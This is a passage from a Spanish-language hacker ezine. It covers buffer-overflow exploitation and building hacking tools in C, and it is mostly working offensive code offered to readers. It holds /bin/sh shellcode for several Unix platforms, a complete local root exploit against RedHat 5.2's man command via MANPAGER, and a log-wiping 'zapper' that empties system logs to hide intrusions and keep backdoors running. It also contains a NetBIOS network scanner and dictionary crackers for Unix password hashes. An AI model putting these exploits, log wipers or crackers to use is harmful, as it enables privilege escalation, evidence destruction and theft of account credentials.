llenamos de NOPs (No operation) nuestro buffer hasta la mitad . 
 
  ptr_buffer = buffer + ((bsize/2) - (strlen(shell)/2)); 
 
  for (i = 0; i < strlen(shell); i++) 
    *(ptr_buffer++) = shell[i]; 
 
desde la mitad menos la mitad del largo de shell code, escribimos la 
shellcode en nuestro buffer. 
 
  buffer[bsize - 1] = 0; 
 
cerramos el string 
 
  execl("./vulnerable", "vulnerable", buffer, 0); 
 
 
ejecutamos el programa con nuestro buffer como argumento. 
} 
 
 
Con eso ya deberias tener la idea de como explotar un buffer overflow... 
Por ultimo te dejo las shellcodes para los distintos sistemas y las 
get_sp() y nops correspondientes. 
Al final agrego como buscar programas con el bit de suid y analizamos 
un overflow exploit un poco distinto. 
 
sacadas de un texto de plasmoid(traducido por ipghost) 
 
------------------------------------------------------------------------ 
 linux/i80386+ 
----------------------------------------------------------------------- 
 codigo ensamblador: 
 ~~~~~~~~~~~~~~ 
                jmp    end_of_code 
 execve:        popl   %esi 
                movl   %esi,0x8(%esi) 
                xorl   %eax,%eax 
                movb   %eax,0x7(%esi) 
                movl   %eax,0xc(%esi) 
                movb   $0xb,%al 
                movl   %esi,%ebx 
                leal   0x8(%esi),%ecx 
                leal   0xc(%esi),%edx 
                int    $0x80 
                xorl   %ebx,%ebx 
                movl   %ebx,%eax 
                inc    %eax 
                int    $0x80 
 end_of_code:   call   exec_prog 
                .string "/bin/sh\" 
 
 cadena para c: 
 ~~~~~~~~~~~~~~~~~~ 
 char execshell[] = 
        "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f" 
        "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd" 
        "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh"; 
 
 ----------------------------------------------------------------------- 
 bsd/os/i80386+ and freebsd/i80386+ 
 ----------------------------------------------------------------------- 
 ensamblador: 
 ~~~~~~~~~~~~~~~ 
                jmp     end_of_code 
 execve:        popl    %esi 
                leal    (%esi), %ebx 
                movl    %ebx, 0x0b(%esi) 
                xorl    %edx, %edx 
                movl    %edx, 7(%esi) 
                movl    %edx, 0x0f(%esi) 
                movl    %edx, 0x14(%esi) 
                movb    %edx, 0x19(%esi) 
                xorl    %eax, %eax 
                movb    $59, %al 
                leal    0x0b(%esi), %ecx 
                movl    %ecx, %edx 
                pushl   %edx 
                pushl   %ecx 
                pushl   %ebx 
                pushl   %eax 
                jmp     bewm 
 end_of_code:   call    execve 
                .string   '/bin/sh' 
                .byte   1, 1, 1, 1 
                .byte   2, 2, 2, 2 
                .byte   3, 3, 3, 3 
 bewm:          .byte   0x9a, 4, 4, 4, 4, 7, 4 
 
 cadena para c: 
 ~~~~~~~~~~~~~~~~~~ 
 char execshell[]= 
     "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f" 
     "\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52" 
     "\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01" 
     "\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04"; 
 
 
 
 ----------------------------------------------------------------------- 
 solaris/sparc  
 ----------------------------------------------------------------------- 
 ensamblador: 
 ~~~~~~~~~~~~~~~ 
                sethi   0xbd89a, %l6 
                or      %l6, 0x16e, %l6 
                sethi   0xbdcda, %l7 
                and     %sp, %sp, %o0 
                add     %sp, 8, %o1 
                xor     %o2, %o2, %o2 
                add     %sp, 16, %sp 
                std     %l6, [%sp - 16] 
                st      %sp, [%sp - 8] 
                st      %g0, [%sp - 4] 
                mov     0x3b, %g1 
                ta      8 
                xor     %o7, %o7, %o0 
                mov     1, %g1 
                ta      8 
 
 cadena para c: 
 ~~~~~~~~~~~~~~~~~~ 
 char execshell[59]= 
        0x2d,0x0b,0xd8,0x9a,0xac,0x15,0xa1,0x6e,0x2f,0x0b,0xdc,0xda,0x90 
        0x0b,0x80,0x0e,0x92,0x03,0xa0,0x08,0x94,0x1a,0x80,0x0a,0x9c,0x03 
        0xa0,0x10,0xec,0x3b,0xbf,0xf0,0xdc,0x23,0xbf,0xf8,0xc0,0x23,0xbf 
        0xfc,0x82,0x10,0x20,0x3b,0x91,0xd0,0x20,0x08,0x90,0x1b,0xc0,0x0f 
        0x82,0x10,0x20,0x01,0x91,0xd0,0x20,0x08"; 
 
  version opcional: 
  char execshell[54]= 
      0x9fc0202c,0xc0247ff5,0xe227bff0,0xc027bff4,0x9207bff0,0x901d200a, 
      0x901a200a,0x8210203b,0x91d02008,0x82102001,0x91d02008,0xa3c3e004,            
"/bin/sh"; 
 
 
 ----------------------------------------------------------------------- 
 sunos/sparc  
 ----------------------------------------------------------------------- 
 ensamblador: 
 ~~~~~~~~~~~~~~~ 
                sethi   0xbd89a, %l6 
                or      %l6, 0x16e, %l6 
                sethi   0xbdcda, %l7 
                and     %sp, %sp, %o0 
                add     %sp, 8, %o1 
                xor     %o2, %o2, %o2 
                add     %sp, 16, %sp 
                std     %l6, [%sp - 16] 
                st      %sp, [%sp - 8] 
                st      %g0, [%sp - 4] 
                mov     0x3b, %g1 
                mov     -0x1, %l5 
                ta      %l5 + 1 
                xor     %o7, %o7, %o0 
                mov     1, %g1 
                ta      %l5 + 1 
 
 cadena para c: 
 ~~~~~~~~~~~~~~~~~~ 
 char execshell[63]= 
       0x2d,0x0b,0xd8,0x9a,0xac,0x15,0xa1,0x6e,0x2f,0x0b,0xdc,0xda,0x90, 
       0x0b,0x80,0x0e,0x92,0x03,0xa0,0x08,0x94,0x1a,0x80,0x0a,0x9c,0x03,                
0xa0,0x10,0xec,0x3b,0xbf,0xf0,0xdc,0x23,0xbf,0xf8,0xc0,0x23,0xbf, 
       0xfc,0x82,0x10,0x20,0x3b,0xaa,0x10,0x3f,0xff,0x91,0xd5,0x60,0x01, 
       0x90,0x1b,0xc0,0x0f,0x82,0x10,0x20,0x01,0x91,0xd5,0x60,0x01"; 
 
 ----------------------------------------------------------------------- 
 hp-ux9/hp9000 
 ----------------------------------------------------------------------- 
 cadena para c: 
 ~~~~~~~~~~~~~~~~~~ 
 char execshell[]= 
      "\x34\x59\x01\x02\x34\x5a\x01\x32\x37\x5a\x3e\xf9\x6b\x3a\x3f\x01" 
      "\x63\x40\x3f\xff\x34\x5a\x01\x38\x63\x40\x3f\x35\x37\x5a\x3e\xf9" 
      "\x6b\x3a\x3f\x09\x63\x40\x3f\xff\x0b\x5a\x02\x9a\x6b\x3a\x3f\x11" 
      "\x34\x5a\x01\x22\x37\x5a\x3e\xf9\x6f\x3a\x3e\xf9\x20\x20\x08\x01"              
"\x34\x16\x01\x1e\xe4\x20\xe0\x08\x36\xd6\x3e\xf9\x0b\x5a\x02\x9a" 
      "\x20\x20\x08\x01\x34\x16\x01\x0a\xe4\x20\xe0\x08\x36\xd6\x3e\xf9" 
      "\xe8\x5f\x1f\x35\x0b\x5a\x02\x9a\x01\x01\x01\x01\x01\x01\x01\x01" 
      "\x01\x01\x01\x01\x01\x01\x01\x01\x00/bin/sh"; 
 
 øapendiceø[øBø] 
 ~~~~~~~~~~~ 
 ----------------------------------------------------------------------- 
 no operation - nop - para diferentes sistemas 
 ----------------------------------------------------------------------- 
 linux/i80386+                            -  char nop[1]=0x90; 
 bsd/os/i80386+ and freebsd/i80386+       -  char nop[1]=0x90; 
 procesador solaris/sparc                 -  char nop[4]=0xac15a16e; 
 procesador sunos/sparc                   -  char nop[4]=0xac15a16e; 
 hp-ux9/hp9000                            -  char nop[4]=0xac15a16e; 
 
 øapendiceø[øCø] 
 ~~~~~~~~~~~ 
 ----------------------------------------------------------------------- 
 linux/i80386+ y bsd/os/i80386+ y freebsd/i80386+ 
 ----------------------------------------------------------------------- 
 averiguando el puntero de la pila: 
 ~~~~~~~~~~~~~~~~~~~~~~~~~ 
 long get_sp() 
 { 
  __asm__("movl %esp,%eax"); 
 } 
 
 ----------------------------------------------------------------------- 
 procesador solaris/sparc y procesador sunos/sparc 
 ----------------------------------------------------------------------- 
 averiguando el puntero de la pila: 
 ~~~~~~~~~~~~~~~~~~~~~~~~~ 
 long get_sp() 
 { 
  asm("or %sp, %sp, %i0"); 
 } 
 
############################################## 
 
 
Para encontrar los archivos con el bit de suid solo usas el comando find 
man find para saber como usarlo y buscas ficheros que tengan +s. 
 
 
EXPLOIT PARA MAN DE REDHAT 5.2 
Pongo este exploit como ejemplo final, para que veas otras maneras de 
explotar los stack overflows. 
 
/* 
 * (c) 2000 babcia padlina / b0f 
 * (lcamtuf's idea) 
 * 
 * redhat /usr/bin/man exploit (gid=15 leads to potential root compromise) 
*/ 
 
#include <stdio.h> 
#include <sys/param.h> 
#include <sys/stat.h> 
#include <string.h> 
 
#define NOP		0x90 
#define OFS		1800 
#define BUFSIZE		4002 
#define ADDRS		1000 
 
long getesp(void) 
{ 
  __asm__("movl %esp, %eax\n"); 
} 
 
int main(argc, argv) 
int argc; 
char **argv; 
{ 
  char *execshell = 
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" 
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" 
    "\x80\xe8\xdc\xff\xff\xff/bin/sh"; 
 
  char *buf, *p; 
  int noplen, i, ofs; 
  long ret, *ap; 
 
  if(!(buf = (char *)malloc(BUFSIZE+ADDRS+1))) 
    { 
      perror("malloc()"); 
      return -1; 
    } 
 
  if (argc > 1) 
    ofs = atoi(argv[1]); 
  else 
    ofs = OFS; 
 
  noplen = BUFSIZE - strlen(execshell); 
  ret = getesp() + ofs; 
 
  memset(buf, NOP, noplen); 
  buf[noplen+1] = '\0'; 
  strcat(buf, execshell); 
 
  p = buf + noplen + strlen(execshell); 
  ap = (unsigned long *)p; 
 
  for(i = 0; i < ADDRS / 4; i++) 
    *ap++ = ret; 
 
  p = (char *)ap; 
  *p = '\0'; 
 
  fprintf(stderr, "RET: 0x%x  len: %d\n\n", ret, strlen(buf)); 
 
  setenv("MANPAGER", buf, 1); 
  execl("/usr/bin/man", "man", "ls", 0); 
 
  return 0; 
} 
 
 
El codeo del exploit es relativamente el mismo, pero la diferencia viene  
aqui: 
  setenv("MANPAGER", buf, 1); 
  execl("/usr/bin/man", "man", "ls", 0); 
 
esto se debe a que la variable que queremos desbordar es MANPAGER, la cual 
no se pasa en lso argumentos sino que es una variable de la shell, por lo 
que hacemos   setenv("MANPAGER", buf, 1);  para setiar la variable como 
nuestro buffer y luego ejecutamos man, el resultado es el mismo y el  
procedimiento tambien. 
 
Espero que te haya sido de utilidad el texto,  
 
Saludos 
z0rbas 
the-little@usa.net 
www.systat.net




====================================================================== 
= 0x0C =============================================================== 
====================================================================== 
====================================================================== 


Programacion de Herramientas en C. 
'''''''''''''''''''''''''''''''''' 
 
Este texto esta orientado a aquellos que no tengan tan buena base en C 
para que puedan crear sus propias herramientas de forma facil y rapida 
en los casos mas insolitos. 
 
Para empezar  veamos el  ejemplo tipico,  cuando estamos  aburridos en 
nuestro colegio  o universidad, la mayoria de los computadores son Win 
y comparten  cosas por netbios. Como  saber de quien es cada PC y como 
ver que comparte cada uno y todo eso. Empezemos de la manera mas facil 
en el caso  de Win, nuestra herramienta  sera el TurboC, basta  con la  
version para DOS, si es para Win, mejor. Analizemos lo basico: 
 
(Si no entiendes algo de los comandos, lee el  articulo  sobre netbios 
que escribi en este mismo ezine) 
 
Primero debemos  saber  el rango de ip,  un ejemplo  de la  vida  real 
(mi colegio) seria  130.0.0.0 con  una mascara  de  red  255.255.255.0 
asique va de 130.0.0.1 a 130.0.0.254 y  aunque no  lo crean hay tantos 
PCs, yo tampoco lo creia hasta que revise bien la red.Bueno ya sabemos  
el rango manos a la obra. 
 
Lo que nos gustaria saber de cada PC 
 
nbtstat -a IP 
net view \\IP 
 
Nada mas creo, otra cosa la agregas tu. 
 
Empezemos, tenemos dos opciones, un exe que cree un bat para ejecutar 
todo esto o que el mismo programa lo ejecute. Hagamos la primera, son  
muy parecidas. 
 
1) Que cree el bat. 
 
----------------------------------------------------------------------- 
#include <stdio.h> 
 
main() 
{ 
int x; 
 printf("echo Scanner por z0rbas > info.txt"); 
for(x=1;x<255;x++) 
 { 
 printf("echo - >> info.txt"); 
 printf("echo Escaniando 130.0.0.%d >> info.txt",x); 
 printf("nbtstat -a 130.0.0.%d >> info.txt",x); 
 printf("net view \\\\130.0.0.%d >> info.txt",x); 
 printf("echo - >> info.txt"); 
 printf("echo - >> info.txt"); 
 } 
} 
------------------------------------------------------------------------ 
ahora lo compilamos y tenemos scan.exe, lo corremos asi: 
C:\TC\BIN> scan > scan.bat 
C:\TC\BIN> scan.bat 
 
Toda la informacion queda en el archivo info.txt  
 
Esto  es  un  ejemplo muy basico, pero  dejemos  el  windows  de  lado y  
empezemos con linux. 
 
Primero las funciones importantes: 
 
-system() 
''''''''' 
Esta esta en DOS en la libreria process.h y en linux no es necesario  
incluirla. Esta funcion se usa asi: 
 
system("dir"); 
 
o por ejemplo 
 
char * comando="dir"; 
system(comando); 
 
 
-sprintf() 
'''''''''' 
Esta funcion incluida en stdio.h es una funcion muy util si la combinamos 
con la funcion de arriba. 
 
sprintf(char * destino,"%s %d y todo lo demas de printf",string,int); 
 
 
Esto es solo la introduccion, pronto haremos el ejemplo. 
 
 
OK, hagamos un pequeño zapper 
(solo pondre 3 ficheros de log, es solo un ejemplo) 
 
------------------------------------------------------------------------- 
#include <stdio.h> 
 
main() 
{ 
/* creamos las variables */ 
 
char comando[80]; 
 
/* Esto es el principio del comando para dejar los logs en cero */ 
 
char * inicio="echo \"\" > "; 
 
/* borramos /var/log/lastlog */ 
sprintf(comando,"%s /var/log/lastlog",inicio); 
system(comando); 
 
/* borramos /var/log/messages */ 
sprintf(comando,"%s /var/log/messages",inicio); 
system(comando); 
 
/* borramos /var/log/secure */ 
sprintf(comando,"%s /var/log/secure",inicio); 
system(comando); 
 
} 
------------------------------------------------------------------------- 
 
Ese es nuestro pequeño zapper, la parte mas complicada es cuando queremos 
que por ejemplo nuestra utilidad siga corriendo siempre. Para eso  puedes 
usar la siguiente funcion que he creado: 
 
#include <signal.h> 
 
sigue(int rato) 
{ 
int x; 
int separacion; 
setpgrp(); 
signal(SIGHUP, SIG_IGN); 
separacion=fork(); 
if(separacion==0) 
{ 
  for(x=1;x<=rato;x++) 
  { 
     sleep(60); 
  } 
  return 0; 
} 
exit(0); 
} 
 
Usemos esa funcion: 
para usarla haces esto: 
sigue(tiempo a dormir en minutos); 
 
Ejemplo: el mismo zapper, pero que repita el borrado luego de 5 minutos: 
 
------------------------------------------------------------------------- 
#include <stdio.h> 
#include <signal.h> 
 
sigue(int rato) 
{ 
int x; 
int separacion; 
setpgrp(); 
signal(SIGHUP, SIG_IGN); 
separacion=fork(); 
if(separacion==0) 
{ 
  for(x=1;x<=rato;x++) 
  { 
     sleep(60); 
  } 
  return 0; 
} 
exit(0); 
} 
 
 
main() 
{ 
/* creamos las variables */ 
 
char comando[80]; 
 
/* Esto es el principio del comando para dejar los logs en cero */ 
 
char * inicio="echo \"\" > "; 
 
sigue(5); 
 
/* borramos /var/log/lastlog */ 
sprintf(comando,"%s /var/log/lastlog"); 
system(comando); 
 
/* borramos /var/log/messages */ 
sprintf(comando,"%s /var/log/messages"); 
system(comando); 
 
/* borramos /var/log/secure */ 
sprintf(comando,"%s /var/log/secure"); 
system(comando); 
} 
 
----------------------------------------------------------------------- 
 
Este  programa se quedara corriendo en background 5 minutos hasta borrar 
los  logs, si  tu te desconectas  del servidor,  sigue igual. Esa  es la  
ventaja,  ya  que si programas un backdoor o un  sniffer, puedes dejarlo 
corriendo. 
 
Para el proximo prometo un tutorial  de Sockets en  C para ampliar  esta 
seccion tambien y comenzar con mejores utilidades. Claro que con ingenio 
basta  esto para hacer  utilidades muy poderosas. Solo  basta moverte un  
poco con el lenguaje C y saber esas funciones que  recalque arriba, para 
poder hacer cosas que te puedem servir bastante, aunque no creas que con 
eso basta, hay que seguir aprendiendo porque la verdad  es que esto solo 
te sirve  para crear bastante  utilidades, pero de una  manera simple, y  
por lo tanto no tan flexible. 
 
Saludos 
z0rbas 




====================================================================== 
= 0x0D =============================================================== 
====================================================================== 
====================================================================== 


====================================================================== 
= MAILS ============================================================== 
====================================================================== 
====================================================================== 
 
 
En  esta seccion respondemos todos los mails que nos  son  enviados  a  
nuestra  casilla  ( syst4t@usa.net ) o  por  lo menos los  que mas nos  
llamen la atencion.  La verdad  es que los  mails que no publicamos es 
porque preferimos  contestarlos en privado,  ya que una  respuesta  en  
publico no seria algo muy educado, no pretendemos hacerle mala fama  a 
nadie, asique si envias un mail, puedes hacerlo con confianza y puedes 
tener la seguridad de que nadie te molestara ni te insultara.  
 
Tambien me gustaria  aprovechar la  oportunidad de decir  a los  otros  
grupos que tienen  ezines o  los que se dedican  a criticar a  lamers,  
creando cosas  como lamerszone, la  verdad es que hay tipos  que se lo  
merecen y es cierto, por creer que lo  saben todo, pero que no  abusen 
dando  mala a fama a  gente que no  los ha  molestado  como  le paso a  
lainfeccion, la cual yo  reconozco que  el nivel  del canal  no es  el  
mejor, pero tambien  conozco a CeroAbsoluto, que es  el creador de esa  
web y del canal, la web tampoco contiene material  impresionante, pero 
en las conversaciones que he tenido  con CeroAbsoluto me he podido dar 
cuenta  que sabe bastante y  ademas me ha contado los planes que tiene  
para su  web y son bastante  buenos, asique  creo que  se  merece  una  
oportunidad  y no que lo  bajen de un golpe con malos  comentarios, la  
critica  ademas  va contra  la  base  del  hacking  que  dice  que  la  
informacion debe ser libre. 
Y  por eso yo creo que lainfeccion esta en todo el derecho de poner lo  
que se le ocurra en su web.  No pretendo  criticar a nadie,  solo  que 
creo que actuaron de mala forma.  
Sé que este texto dara mucho que hablar y generara multiples opiniones  
sobre Systat Security Team, pero la verdad es que no me importa mucho, 
nadie esta obligado a  visitar la web ni a leer el ezine. Y tengo todo  
el derecho a escribir lo que quiera en el. 
 
                                                      z0rbas 
 
 
====================================================================== 
== 0x01 ============================================================== 
====================================================================== 
 
Hola z0rbas : 
 
Hace tiempo que me baje  un texto  que escribiste  tu: "Passwords en UNIX", 
pero hasta la fecha  de hoy no me lo habia  leido. Queria felicirate por el 
excelente trabajo  que has hecho, y en  particular por los dos ejemplos que 
has traducido y comentado. En el texto comentas que no es muy dificil hacer 
un  crackeador  de  passwd  y  que  se  podria hacer uno  de unas 30 lineas 
aproximadamente; El caso es que yo uso el crackeador John The Ripper,  pero 
me gustaria hacerme el mio propio;Me podria mirar el codigo fuente del John 
The Ripper, pero preferiria empezar por un crackeador un poco mas sencillo; 
Si dispones  del codigo  fuente de un  crackeador de passwd  para unix, por 
favor si puedes  me lo mandas, y  si no  me  dices donde puedo conseguirlo. 
 
Hace mucho tiempo que no me paso por #lainfeccion @ irc.dal.net, y creo que 
nunca hablamos en el IRC;Si quieres comentarme o preguntarme cualquier cosa 
me puedes mandar un mail o quizas me puedas encontrar en el IRC: #hackindex 
@ irc.irc-vulcano.com. 
 
Saludos, kdt00ls . 
 
&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%& 
&% RESPUESTA %&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%& 
&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%& 
 
 
Hola, 
Primero que nada gracias por la critica, sobre lo del crackeador, con gusto 
te doy una ayudita.Tomando en cuenta que tuviese un diccionario de palabras 
y el password encriptado,  solo te queda  comenzar a compararlos,  y eso es 
precisamente lo que hace la funcion  que traduci, por lo que el  crackeador 
seria mas o menos asi: 
(esto es solo un bosquejo, porque sino tendria  que  escribir la  parte del  
programa que  falta, la cual se puede  sacar  perfectamente de los ejemplos  
del tutorial de C) 
 
--------------------------------------------------------------------------- 
#include <pwd.h> 
#include ... 
 
#define UPAP_AUTHNAK 0 
#define UPAP_AUTHAcK 1 
 
 
/* este programa chequea un usuario y password, basado en el fichero de  
password(/etc/passwd) para la autentificación, también chequea si el  
usuario es valido.  
Retornos de la función: 
UPAP_AUTHNAK : logeo fallido. 
UPAP_AUTHACK : logeo exitoso. 
En algunos casos la variable msg apunta a un mensaje en especial.  
(Traducido por z0rbas)                           
                                                                   */ 
 
Static int login(usuario, passwd, msg, largomsg) 
        	Char *usuario; 
       	Char *password; 
        	Char **msg; 
 	Int *largomsg;            // definición de los argumentos de la  
función. 
{ 
	struct passwd *pw;  // define puntero a la estructura del registro 
	char *epasswd;        // puntero a lo que será la pass encriptada 
	 
	if((pw=getpwnam(usuario))==NULL) return(UPAP_AUTHNAK);  
 
/* se asigna el valor a la estructura apuntada por pw, con el valor del  
registro del usuario correspondiente, usando la función getpwnam() y se  
compara al tiro con NULL, si es verdadero, quiere decir que el usuario  
no se encontró y el login se rechaza. */ 
 
 
	if(pw->pw_passwd == '\0') return(UPAP_AUTHACK);  
 
/* se compara el campo de password con NULL, si es verdadero, no hay  
password en el campo y el logeo es aceptado, no se necesita revisar el  
password */ 
 
 
	epasswd = crypt(password, pw->pw_passwd);  
 
/* encripta el password con la semilla del password original. */ 
 
 
	if(strcmp(epasswd, pw->pw_passwd)) return(UPAP_AUTHNAK); 
 
/* si son distintos los dos string( epasswd, el password  
encriptado(instrucción pasada) y el password original del fichero se  
rechaza el login, si a estas alturas aun no se ha rechazado, el sistema  
reconoce el password como correcto */ 
 
 
 
 
	return(UPAP_AUTHACK); 
} 
 
main(int argc, char * argv) /* yo pondria q por aqui se pasara el user */ 
{ 
/********************************** 
* AQUI ESTA LA FUNCION MAIN !!!   * 
**********************************/ 
 
char user[30]; 
char pass_lista_palabras[50];   
int estado; 
 
... va probando las palabras del diccionario asi: 
 
estado = login(user,pass_lista_palabras,"",0); 
 
ahora ve si es correcto el password 
 
if(estado==UPAP_AUTHAcK) 
  { 
  printf("El password para %s es %s",user,pass_lista_palabras); 
  exit(0) 
  } 
 
si no paso esto, sigue probando  ^ 
                              ___| 
                                
 
----------------------------------------------------------------------- 
Otra cosa que te puede servir es este cracker escrito por GuyBrush: 
----------------------------------------------------------------------- 
// Programa que lee palabras de cualquier diccionario o texto y después de 
// encriptarlas las compara. 
// Copyright (c) Guybrush 
 
 
#include <stdio.h> 
#include <pwd.h> 
 
 
char cadena[30]; 
char clave[30]; 
 
struct passwd *pwd; 
 
 
int desencripta(char *clave, char *archivo) 
{ 
   FILE *fichero; 
    
   char *crypt(), *resp; 
   int cont; 
 
   if ((fichero = fopen(archivo,"r")) == NULL) 
   { 
      printf("\nError al abrir diccionario\n"); 
      exit(0); 
   } 
 
   while (!feof(fichero)) 
   { 
      cont = 0; 
 
      do 
      { 
         cadena[cont] = fgetc(fichero); 
         cont++; 
      } while ((cadena[cont-1] != '\n') && (cadena[cont-1] != ' ') && 
               (cadena[cont-1] != ',') && (cadena[cont-1] != '.') && 
               (cadena[cont-1] != ';') && (cadena[cont-1] != ':') && 
               (!feof(fichero))); 
       
      cadena[cont-1] = '\x0'; 
 
      resp = crypt(cadena,clave); 
 
      if (!strcmp(resp,clave))  
 
      { 
         printf("\a\n\n\n ==> El password es : %s <==\n\n\n",cadena); 
         fclose(fichero); 
 
         return 1; 
      } 
   } 
 
   fclose(fichero); 
    
   return 0; 
} 
 
 
main(int argc, char **argv) 
{ 
   int respuesta; 
   char clave[15]; 
 
   if (argc == 3) 
   {  
      if (!(pwd = getpwnam(argv[1]))) 
      { 
         printf("\nUsuario desconocido.\n\n"); 
         exit(-1); 
      } 
 
      strcpy(clave,pwd->pw_passwd); 
 
      endpwent(); 
 
      printf("\n\nBuscando palabras en el diccionario ...\n\n"); 
 
      respuesta = desencripta(clave,argv[2]); 
 
      if (respuesta != 1)  
         printf("\n\n\nPalabra no encontrada en el diccionario.\n\n\n"); 
   } 
   else 
      printf("\n\nUsar: %s <usuario> <diccionario donde buscar>\n\n",argv[0]); 
} 
------------------------------------------------------------------------ 
Es bastante simple, por lo que no deberias tener dificultades con el. 
 
Espero que esto te haya servido, si no enviame un mail y vemos que  
podemos hacer. 
 
Saludo  
z0rbas 
 
====================================================================== 
== 0x02 ============================================================== 
====================================================================== 
 
Hola estoy bajando archivo de su pagina y  
no puedo abrir ninguno por que los desconoce la  
extension, yo uso windows98. 
 
 
GRACIAS MEMO 
 
Envia gratis tus postales musicales 
de Navidad desde http://www.mixmail.com 
 
&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%& 
&% RESPUESTA %&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%& 
&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%& 
 
 
Bueno en la epoca que visitaste nuestra web, todos los archivos eran .c 
y esos son codigos de fuente que a lo mas en windows puedes darle la 
utlidad de abrirlos ocn el block de notas y estudiarlos. En linux puedes 
convertirlos en ejecutables, para saber como hacer esto, lee el articulo 
de UNIX/Linux un poco mas arriba. En todo caso en este momento tambien 
tenemos archivos para windows, aunque la mayoria para NT/2K y los que 
corren en 98, no se comparan mucho con algunos similar para linux. 
 
Saludo 
z0rbas 
 
 
====================================================================== 
== 0x03 ============================================================== 
====================================================================== 
 
Felicitaciones por el ezine. 
 
Me interesaria, si pueden mandarmelo por email cada vez que lo publican. 
La direccion de su site no funciona http://tlateam.virtualave.net  
mendenme otra direccion donde conseguir los ezines 
Consejo lo podrian poner numero a los ezines. 
 
Saludos.... 
 
Yo tengo este INDICE: archivo tla01.txt 
 
@ Saludo 
Bienvenida a nuestro E-Zine. (por z0rbas) 
 
@ Passwords en Unix  
Texto que trata sobre los passwords en unix, metodo de encriptacion 
uso de estos en algunos programas y otros ejemplos. (por z0rbas) 
 
@ Explotar NetBIOS desde Linux 
Texto para entrar en otros PCs por NetBIOS (por DrAkO) 
 
@ Explotar NetBIOS desde Windows 
Este texto explica un poco lo mismo que el texto escrito por DrAkO,  
pero para aquellos que usan windows.Bastante resumido.  
Por z0rbas)  
 
@ Tutorial de C 
Texto introductorio al lenguaje C, bastante completo, basico para lo 
que vendra en los proximos numeros. (por z0rbas) 
 
@ Culrura Informatica 
Esta seccion estara presente en todos nuestros numeros y la idea 
es ir profundizando en temas que no se encuentran en cualquier parte 
los proximos numeros, seguiremos sobre el mismo tema(Sistemas  
operativos), el texto lo hice muy corto y resumido, ya que segun lo 
que hable con unos colegas en el IRC este tema no interesa mucho en  
general, ya para el proximo numero hablaremos un poco sobre virus,  
en todo caso si estas interesado, avisa, ya que si hay suficiente  
gente interesada, seguiriamos desarrollando este tema. 
(por z0rbas) 
 
@ Exploits 
En este numero veremos algunos exploits simples, y los analizaremos 
para el proximo terminare el texto de exploits para comenzar a  
escribir nuestros propios exploits. 
 
@ Agradecimientos y despedida 
No necesita explicacion creo...(por z0rbas) 
 
 
 
&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%& 
&% RESPUESTA %&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%& 
&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%& 
 
 
Muchas gracias primero que nada, con lo de la web y el ezine, la web 
esta ahora en www.systat.net y el ezine ha partido de cero, o sea, 
todo de nuevo. Espero que te guste la nueva ;) 
 
Saludos z0rbas 
 
 
 
 
 
 
====================================================================== 
== FIN =============================================================== 
====================================================================== 
 
 
Bueno aun tenemos poquitos mails, esperamos empezar a recibir algunos mails 
mas. Tenemos 3 mas en la casilla, pero no son dignos de publicar ;) 
 
 




====================================================================== 
= 0x0E =============================================================== 
====================================================================== 
====================================================================== 


			SUGERENCIAS 
			----------- 
 
Ya estamos casi despidiendonos, nos gustaria pedirles un favor, si alguno 
de ustedes se anima a escribir un  texto sobre  seguridad,  programacion,  
virus, cracking, phreaking o cualquier cosa  relacionada, por  favor  que 
lo  envie para publicarlo,  nos ayudaria mucho en nuestro trabajo para el 
ezine, esperamos recibir algo. Para contactarnos solo escribe a 
syst4t@usa.net. 
 
Tambien  decirles que  cualquier  cosa  que  quieran  preguntar,  opinar,  
criticar, etc.  envienlo tambien  a syst4t@usa.net,  siempre y cuando sea 
constructivo. 
 
Tambien  nos  gustaria mucho  que  nos  enviaran  logs  de  hackeos  para  
publicarlos,  eso seria algo bastante  entretenido, ademas que productivo  
para todos. Claro que nos reservamos el derecho de sensurar algunas cosas 
pero  algo relajado como  la seccion de rooteando  de este numero estaria 
bien. Cosas como passwords y cuentas  en servidores no  las publicaremos, 
ya que no pretendemos incitar la ilegalidad. 
 
 
							z0rbas





====================================================================== 
= 0x0F =============================================================== 
====================================================================== 
====================================================================== 


				DESPEDIDA 
				--------- 
 
Ya nos estamos despediendo, con esto termina nuestro primer numero del  
ezine, esperamos que le haya gustado nuestro humilde trabajo. 
 
Todo comentario sobre este y sugerencia sera bienvenida,solo enviala a 
syst4t@usa.net. Esperamos dentro de un tiempo volver con otro  numero, 
y tratar de ir mejorando el nivel de la revista cada vez mas. 
 
No somos expertos  en  estos  temas,  solo  nos  interesan  y  estamos  
